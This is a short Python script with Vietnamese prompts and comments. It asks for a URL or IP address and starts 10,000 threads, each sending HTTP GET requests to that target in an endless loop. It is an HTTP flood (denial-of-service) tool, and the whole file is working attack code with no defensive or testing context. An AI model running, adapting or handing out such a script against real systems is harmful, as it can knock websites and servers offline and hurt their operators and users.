import threading
import requests

url = input("Nhập URL hoặc IP: ")

def send_request():
    while True:
        try:
            response = requests.get(url)
            if response.status_code == 200:
                print("Yêu cầu thành công!")
        except requests.exceptions.RequestException as e:
            print("Lỗi:", e)

# Tạo và bắt đầu 10000 thread
for _ in range(10000):
    thread = threading.Thread(target=send_request)
    thread.start()
